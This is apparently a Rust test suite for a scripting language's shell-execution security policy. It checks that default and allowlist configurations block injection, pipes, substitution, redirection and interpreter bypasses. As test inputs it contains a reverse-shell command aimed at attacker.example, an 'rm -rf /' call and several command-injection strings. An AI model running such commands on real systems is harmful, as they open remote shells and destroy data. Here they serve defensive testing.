use std::fs;
use std::process::Command;
use std::thread;
use std::time::Duration;
use tempfile::TempDir;

/// Temp directory holding a `.wfl` program and optional `.wflcfg` so config walk-up works.
struct TempWflEnv {
    _dir: TempDir,
    program_path: String,
}

impl TempWflEnv {
    fn new(code: &str, config: Option<&str>) -> Result<Self, std::io::Error> {
        let dir = TempDir::new()?;
        if let Some(cfg) = config {
            fs::write(dir.path().join(".wflcfg"), cfg)?;
        }
        let program_path = dir.path().join("test_program.wfl");
        fs::write(&program_path, code)?;
        Ok(TempWflEnv {
            _dir: dir,
            program_path: program_path.to_string_lossy().to_string(),
        })
    }

    fn path(&self) -> &str {
        &self.program_path
    }
}

const PERMISSIVE_CONFIG: &str = r#"
allow_shell_execution = true
shell_execution_mode = sanitized
warn_on_shell_execution = false
"#;

#[cfg(not(windows))]
const ALLOWLIST_PROGRAM_CONFIG: &str = r#"
allow_shell_execution = true
shell_execution_mode = allowlist_only
allowed_shell_commands = echo
warn_on_shell_execution = false
"#;

// Windows has no standalone echo.exe. Use a non-shell executable so the
// allowlist fixture does not itself grant arbitrary `/C` command execution.
#[cfg(windows)]
const ALLOWLIST_PROGRAM_CONFIG: &str = r#"
allow_shell_execution = true
shell_execution_mode = allowlist_only
allowed_shell_commands = where.exe
warn_on_shell_execution = false
"#;

fn wfl_exe() -> &'static str {
    if cfg!(target_os = "windows") {
        "target/release/wfl.exe"
    } else {
        "target/release/wfl"
    }
}

fn run_wfl(code: &str) -> Result<String, String> {
    run_wfl_with_config(code, None)
}

fn run_wfl_with_config(code: &str, config: Option<&str>) -> Result<String, String> {
    let env = TempWflEnv::new(code, config).expect("Failed to create temp WFL env");

    let output = Command::new(wfl_exe())
        .arg(env.path())
        .output()
        .expect("Failed to execute WFL");

    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
    let combined = format!("{}{}", stdout, stderr);

    // Policy denials and runtime errors are reported on stderr (and may also
    // appear in the combined stream). Treat non-success exit or error text as Err.
    let looks_like_error = !output.status.success()
        || combined.contains("blocked by security policy")
        || combined.contains("Command blocked")
        || (combined.contains("error") || combined.contains("Error"));

    if looks_like_error
        && (combined.contains("blocked")
            || combined.contains("security policy")
            || combined.contains("disabled")
            || !output.status.success())
    {
        // Prefer classifying security blocks as Err even if exit is non-zero
        if combined.contains("blocked")
            || combined.contains("security policy")
            || combined.contains("allow_shell_execution")
            || combined.contains("disabled")
        {
            return Err(combined);
        }
        if !output.status.success() {
            return Err(combined);
        }
    }

    if !stderr.is_empty() && (stderr.contains("error") || stderr.contains("Error")) {
        Err(stderr)
    } else {
        Ok(combined)
    }
}

/// Run WFL with retry logic that validates output contains expected strings
fn run_wfl_with_validation(
    code: &str,
    config: Option<&str>,
    max_attempts: usize,
    expected_strings: &[&str],
) -> Result<String, String> {
    let mut last_result = Err("Not attempted".to_string());

    for attempt in 1..=max_attempts {
        match run_wfl_with_config(code, config) {
            Ok(output) => {
                let all_present = expected_strings.iter().all(|s| output.contains(s));

                if all_present {
                    return Ok(output);
                } else {
                    let missing: Vec<&str> = expected_strings
                        .iter()
                        .filter(|s| !output.contains(*s))
                        .copied()
                        .collect();
                    last_result = Err(format!(
                        "Output missing expected strings after {} of {} attempts. Missing: {:?}. Actual output: '{}'",
                        attempt, max_attempts, missing, output
                    ));
                    if attempt < max_attempts {
                        thread::sleep(Duration::from_millis(
                            150 * 2u64.saturating_pow((attempt - 1) as u32),
                        ));
                    }
                }
            }
            Err(e) => {
                last_result = Err(e);
                if attempt < max_attempts {
                    thread::sleep(Duration::from_millis(
                        150 * 2u64.saturating_pow((attempt - 1) as u32),
                    ));
                }
            }
        }
    }

    last_result
}

fn assert_blocked(result: Result<String, String>, context: &str) {
    assert!(
        result.is_err(),
        "{} should be blocked by default security policy, got: {:?}",
        context,
        result
    );
    let err = result.unwrap_err();
    assert!(
        err.contains("security policy")
            || err.contains("blocked")
            || err.contains("disabled")
            || err.contains("allow_shell_execution"),
        "{}: error should mention security policy: {}",
        context,
        err
    );
    assert!(
        !err.contains("pwned") || err.contains("blocked"),
        "{}: payload must not execute successfully: {}",
        context,
        err
    );
}

#[test]
fn test_shell_injection_blocked_by_default() {
    let code = r#"
        execute command "echo test; echo injected" as result
    "#;

    assert_blocked(run_wfl(code), "Command with semicolon");
}

#[test]
fn test_direct_exec_shell_with_args_blocked_by_default() {
    // Finding 1 bypass: non-empty args skipped the sanitizer under Forbidden.
    #[cfg(not(windows))]
    let code = r#"
        execute command "sh" with arguments ["-c", "echo pwned"] as result
        display result
    "#;

    #[cfg(windows)]
    let code = r#"
        execute command "cmd.exe" with arguments ["/C", "echo pwned"] as result
        display result
    "#;

    let result = run_wfl(code);
    assert_blocked(result.clone(), "Shell interpreter with -c /C args");
    if let Err(err) = result {
        assert!(
            !err.lines().any(|l| l.trim() == "pwned"),
            "Payload must not print: {}",
            err
        );
    }
}

#[test]
fn test_plain_binary_without_metacharacters_blocked_by_default() {
    // Finding 1 bypass: no metacharacters + empty args skipped the sanitizer.
    let code = r#"
        execute command "nc -e /bin/sh attacker.example 4444" as result
    "#;

    assert_blocked(run_wfl(code), "Plain reverse-shell style command");
}

#[test]
fn test_safe_argument_execution_blocked_by_default() {
    // Secure defaults deny all process execution, including "safe" argv form.
    let code = r#"
        wait for execute command "echo" with arguments ["hello", "world"] as result
        display result
    "#;

    assert_blocked(run_wfl(code), "Direct-exec under default config");
}

#[test]
fn test_safe_argument_execution_with_opt_in_config() {
    #[cfg(not(windows))]
    let code = r#"
        wait for execute command "echo" with arguments ["hello", "world"] as result
        display result
    "#;
    #[cfg(windows)]
    let code = r#"
        wait for execute command "cmd.exe" with arguments ["/C", "echo hello world"] as result
        display result
    "#;

    let result = run_wfl_with_config(code, Some(PERMISSIVE_CONFIG));
    assert!(
        result.is_ok(),
        "Opt-in sanitized config should allow direct-exec: {:?}",
        result
    );
    assert!(
        result.unwrap().to_lowercase().contains("hello"),
        "Output should contain expected text"
    );
}

#[test]
fn test_allowlist_only_blocks_non_listed_program() {
    let code = r#"
        wait for execute command "rm" with arguments ["-rf", "/"] as result
    "#;

    assert_blocked(
        run_wfl_with_config(code, Some(ALLOWLIST_PROGRAM_CONFIG)),
        "Non-allowlisted program",
    );
}

#[test]
fn test_allowlist_only_allows_listed_program() {
    #[cfg(not(windows))]
    let code = r#"
        wait for execute command "echo" with arguments ["allowlisted"] as result
        display result
    "#;
    #[cfg(windows)]
    let code = r#"
        wait for execute command "where.exe" with arguments ["cmd.exe"] as result
        display result
    "#;

    let result = run_wfl_with_config(code, Some(ALLOWLIST_PROGRAM_CONFIG));
    assert!(
        result.is_ok(),
        "Allowlisted program should run: {:?}",
        result
    );
    #[cfg(not(windows))]
    assert!(result.unwrap().contains("allowlisted"));
    #[cfg(windows)]
    assert!(result.unwrap().to_ascii_lowercase().contains("cmd.exe"));
}

#[test]
fn test_allowlist_only_blocks_shell_chaining_after_allowlisted_program() {
    #[cfg(not(windows))]
    let code = r#"
        execute command "echo allowlisted; echo injected" as result
    "#;
    #[cfg(windows)]
    let code = r#"
        execute command "where.exe cmd.exe & echo injected" as result
    "#;

    let result = run_wfl_with_config(code, Some(ALLOWLIST_PROGRAM_CONFIG));
    assert_blocked(result.clone(), "Shell chaining after allowlisted program");
    if let Err(err) = result {
        assert!(
            !err.lines().any(|line| line.trim() == "injected"),
            "The unlisted chained payload must not execute: {err}"
        );
    }
}

#[test]
fn test_pipe_blocked_by_default() {
    let code = r#"
        execute command "echo test | grep test" as result
    "#;

    assert_blocked(run_wfl(code), "Command with pipe");
}

#[test]
fn test_command_substitution_blocked() {
    #[cfg(not(windows))]
    let code = r#"
        execute command "echo $(whoami)" as result
    "#;

    #[cfg(windows)]
    let code = r#"
        execute command "echo test" as result
    "#;

    assert_blocked(run_wfl(code), "Command substitution / default exec");
}

#[test]
fn test_background_execution_blocked() {
    #[cfg(not(windows))]
    let code = r#"
        execute command "echo test &" as result
    "#;

    #[cfg(windows)]
    let code = r#"
        execute command "echo test" as result
    "#;

    assert_blocked(run_wfl(code), "Background execution / default exec");
}

#[test]
fn test_redirection_blocked() {
    let code = r#"
        execute command "echo test > output.txt" as result
    "#;

    assert_blocked(run_wfl(code), "Command with redirection");
}

#[test]
fn test_simple_command_without_args_blocked_by_default() {
    #[cfg(not(windows))]
    let code = r#"
        wait for execute command "pwd" as result
        display result
    "#;

    #[cfg(windows)]
    let code = r#"
        wait for execute command "hostname" as result
        display result
    "#;

    assert_blocked(run_wfl(code), "Simple command under default");
}

#[test]
fn test_simple_command_with_opt_in_config() {
    #[cfg(not(windows))]
    let code = r#"
        wait for execute command "pwd" as result
        display result
    "#;

    #[cfg(windows)]
    let code = r#"
        wait for execute command "hostname" as result
        display result
    "#;

    let result = run_wfl_with_config(code, Some(PERMISSIVE_CONFIG));
    assert!(
        result.is_ok(),
        "Simple command under sanitized config should work: {:?}",
        result
    );
}

#[test]
fn test_spawn_with_safe_arguments_blocked_by_default() {
    let code = r#"
        spawn command "echo" with arguments ["test"] as proc_id
    "#;

    assert_blocked(run_wfl(code), "Spawn under default config");
}

#[test]
fn test_spawn_with_safe_arguments_opt_in() {
    #[cfg(not(windows))]
    let code = r#"
        spawn command "echo" with arguments ["test"] as proc_id
        wait for 250 milliseconds
        wait for read output from process proc_id as proc_output
        wait for process proc_id to complete
        display proc_output
    "#;
    #[cfg(windows)]
    let code = r#"
        spawn command "cmd.exe" with arguments ["/C", "echo test"] as proc_id
        wait for 250 milliseconds
        wait for read output from process proc_id as proc_output
        wait for process proc_id to complete
        display proc_output
    "#;

    let result = run_wfl_with_validation(code, Some(PERMISSIVE_CONFIG), 5, &["test"]);
    assert!(
        result.is_ok(),
        "Spawn with safe arguments under opt-in should work: {:?}",
        result
    );

    let output = result.unwrap();
    assert!(
        output.contains("test"),
        "Output should contain expected text 'test'. Actual output: '{}'",
        output
    );
}

#[test]
fn test_spawn_shell_interpreter_args_blocked_by_default() {
    #[cfg(not(windows))]
    let code = r#"
        spawn command "sh" with arguments ["-c", "echo pwned"] as proc_id
    "#;

    #[cfg(windows)]
    let code = r#"
        spawn command "cmd.exe" with arguments ["/C", "echo pwned"] as proc_id
    "#;

    assert_blocked(run_wfl(code), "Spawn shell interpreter with args");
}

#[test]
fn test_spawn_shell_blocked_by_default() {
    #[cfg(not(windows))]
    let code = r#"
        spawn command "echo $HOME" as proc_id
    "#;

    #[cfg(windows)]
    let code = r#"
        spawn command "echo test" as proc_id
    "#;

    assert_blocked(run_wfl(code), "Spawn with shell features / default");
}

#[test]
fn test_multiple_safe_processes_opt_in() {
    #[cfg(not(windows))]
    let code = r#"
        spawn command "echo" with arguments ["test1"] as proc1
        spawn command "echo" with arguments ["test2"] as proc2
        wait for 250 milliseconds
        wait for read output from process proc1 as out1
        wait for read output from process proc2 as out2
        wait for process proc1 to complete
        wait for process proc2 to complete
        display out1
        display out2
    "#;
    #[cfg(windows)]
    let code = r#"
        spawn command "cmd.exe" with arguments ["/C", "echo test1"] as proc1
        spawn command "cmd.exe" with arguments ["/C", "echo test2"] as proc2
        wait for 250 milliseconds
        wait for read output from process proc1 as out1
        wait for read output from process proc2 as out2
        wait for process proc1 to complete
        wait for process proc2 to complete
        display out1
        display out2
    "#;

    let result = run_wfl_with_validation(code, Some(PERMISSIVE_CONFIG), 5, &["test1", "test2"]);
    assert!(
        result.is_ok(),
        "Multiple safe processes under opt-in should work: {:?}",
        result
    );

    let output = result.unwrap();
    assert!(
        output.contains("test1"),
        "Output should contain 'test1'. Actual output: '{}'",
        output
    );
    assert!(
        output.contains("test2"),
        "Output should contain 'test2'. Actual output: '{}'",
        output
    );
}
